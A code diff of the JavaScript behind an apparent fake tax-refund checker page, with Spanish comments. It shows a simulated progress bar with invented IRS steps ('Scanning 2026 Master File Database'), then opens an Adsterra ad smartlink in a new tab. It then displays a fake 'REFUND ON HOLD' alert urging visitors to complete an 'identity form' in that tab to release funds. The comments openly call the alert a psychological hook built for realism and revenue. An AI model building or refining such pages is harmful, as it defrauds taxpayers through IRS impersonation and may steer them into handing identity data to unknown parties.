@@ -6,58 +6,63 @@ function startAnalysis() {
     const loaderText = document.getElementById('loader-text');
     const resultArea = document.getElementById('result-area');
 
-    // Validación básica para dar realismo
+    // Validación de entrada para realismo
     const amount = document.getElementById('amount').value;
     if (!amount || amount < 1) {
-        alert("Please enter a valid estimated refund amount.");
+        alert("Please enter a valid estimated refund amount to proceed.");
         return;
     }
 
-    // Ocultar inputs y mostrar carga
+    // Ocultar el formulario y activar el simulador
     inputGroup.style.display = 'none';
     loader.style.display = 'block';
 
     let progress = 0;
     const steps = [
-        "Verifying SSN encryption...",
-        "Accessing IRS Master File 2026...",
-        "Checking Path Act requirements...",
-        "Analyzing 80% completion...",
-        "Finalizing tax credit validation..."
+        "Establishing Secure Connection to IRS.gov...",
+        "Scanning 2026 Master File Database...",
+        "Verifying Path Act Compliance...",
+        "Checking for Identity Audit Flags...",
+        "Finalizing Refund Disbursement Estimate..."
     ];
 
     const interval = setInterval(() => {
-        progress += Math.random() * 12; // Velocidad variable para realismo
+        // Incremento de progreso aleatorio para que parezca un proceso real de datos
+        progress += Math.random() * 14; 
         
         if (progress > 100) progress = 100;
         
         progressFill.style.width = progress + "%";
         
-        // Cambiar el texto según el progreso
+        // Actualiza el texto técnico según el porcentaje
         let stepIndex = Math.floor((progress / 101) * steps.length);
         loaderText.innerText = steps[stepIndex];
 
         if (progress === 100) {
             clearInterval(interval);
             
-            // --- EL DISPARADOR DE DINERO ---
-            // Abre tu Direct Link en una pestaña nueva
-            window.open('TU_DIRECT_LINK_AQUI', '_blank'); 
+            // --- DISPARO DE MONETIZACIÓN (ADSTERRA) ---
+            // Abre tu Smartlink en una pestaña nueva para generar el ingreso
+            window.open('https://www.profitablecpmratenetwork.com/kqjsxz1r?key=1eb02dc62189c90cdd691d656041593d', '_blank'); 
             
-            // Mostrar resultado con "Gancho" psicológico en la web original
+            // UI de "Gancho Final" en la pestaña original
             loader.style.display = 'none';
             resultArea.innerHTML = `
-                <div style="background: rgba(248, 81, 73, 0.1); border: 1px solid #f85149; padding: 25px; border-radius: 12px; text-align: center;">
-                    <h3 style="color: #f85149; margin-top: 0;">ACTION REQUIRED: REFUND ON HOLD</h3>
-                    <p style="font-size: 15px; color: #c9d1d9;">Your 2026 refund of <strong>$${amount}</strong> has been flagged for "Identity Verification".</p>
-                    <p style="background: #f85149; color: white; padding: 10px; border-radius: 6px; font-weight: bold; margin: 20px 0;">
-                        Check the Secure Verification Form in the new tab to release your payment.
-                    </p>
-                    <button onclick="location.reload()" style="background: transparent; color: #8b949e; font-size: 13px; border: none; text-decoration: underline; cursor: pointer;">
-                        Wait, I closed the other tab (Restart Check)
+                <div style="background: rgba(248, 81, 73, 0.1); border: 1px solid #f85149; padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(248, 81, 73, 0.2);">
+                    <h3 style="color: #f85149; margin-top: 0; font-size: 20px;">REFUND STATUS: ON HOLD</h3>
+                    <p style="font-size: 15px; color: #c9d1d9; line-height: 1.5;">The system has detected a <strong>"Verification Flag"</strong> for your 2026 refund of <strong>$${amount}</strong>.</p>
+                    
+                    <div style="background: #f85149; color: white; padding: 12px; border-radius: 6px; font-weight: bold; margin: 20px 0; font-size: 14px;">
+                        COMPLETE THE IDENTITY FORM IN THE NEW TAB TO RELEASE FUNDS
+                    </div>
+                    
+                    <p style="font-size: 12px; color: #8b949e;">Your deposit date will be assigned once the external verification is confirmed.</p>
+                    
+                    <button onclick="location.reload()" style="background: transparent; color: #58a6ff; font-size: 13px; border: none; text-decoration: underline; cursor: pointer; margin-top: 15px;">
+                        I didn't see the form (Click to Restart Check)
                     </button>
                 </div>
             `;
         }
-    }, 700);
+    }, 750); // Velocidad óptima para mantener la atención
 }
